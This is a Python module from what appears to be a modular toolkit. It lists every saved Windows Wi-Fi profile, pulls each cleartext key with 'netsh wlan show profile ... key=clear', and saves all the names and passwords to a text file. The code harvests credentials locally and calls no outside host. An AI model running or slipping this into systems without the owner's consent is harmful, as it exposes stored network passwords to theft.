import os
import subprocess
from pathlib import Path

from config import ModuleManager


class WifiPasswordRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_path="network/wifi")
        self.banner(r"""
     _______         _  _  _ _       _______ _ 
    |.-----.|       (_)(_)(_|_)     (_______|_)
    ||x . x||        _  _  _ _ _____ _____   _ 
    ||_.-._||       | || || | (_____)  ___) | |
    `--)-(--`       | || || | |     | |     | |
   __[=== o]___      \_____/|_|     |_|     |_|
  |:::::::::::|\    
  `-=========-`()            Passwords
                    """)
        
        self.wifi_passwords_filename: Path = self.module_output / "wifi_passwords.txt"


    def _get_wifi_profiles(self) -> list[str]:
        """Get all available WiFi profiles."""
        self.mdebug(f"Running command: `netsh wlan show profiles`")
        
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]
            self.mdebug(f"Found a total of {len(profiles)} WiFi networks")
            return profiles
        except subprocess.CalledProcessError:
            self.merror("Error retrieving WiFi profiles")
            return []

    def _get_wifi_password(self, profile: str) -> str:
        """Get the password for a given WiFi profile."""
        try:
            self.mdebug(f"Running command: `netsh wlan show profile {profile} key=clear`")
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            password = next((line.split(":")[1][1:-1] for line in results if "Key Content" in line), None)
            if password:
                self.mdebug(f"Found password for {profile} WiFi network")
            else:
                self.mdebug(f"No password found for {profile} WiFi network")
            return password or ""
        except subprocess.CalledProcessError:
            self.merror(f"Unable to retrieve WiFi password for {profile}")
            return "ENCODING ERROR"
        except Exception as e:
            self.merror(f"Unexpected error while retrieving password for {profile}: {e}")
            return "ERROR"

    def _save_wifi_passwords(self, profiles: list[str]) -> None:
        """Save the WiFi passwords to a file."""
        with open(self.wifi_passwords_filename, 'w+') as file:
            self.mdebug(f"Created file and starting to save WiFi passwords to it -> {self.wifi_passwords_filename}")
            
            for profile in profiles:
                password = self._get_wifi_password(profile)
                file.write(f"\n{profile:<30}|  {password:<}")
                
            self.mprint(f"Saved all WiFi passwords to {self.wifi_passwords_filename}")

    def run(self) -> None:
        profiles = self._get_wifi_profiles()
        if profiles:
            self._save_wifi_passwords(profiles)
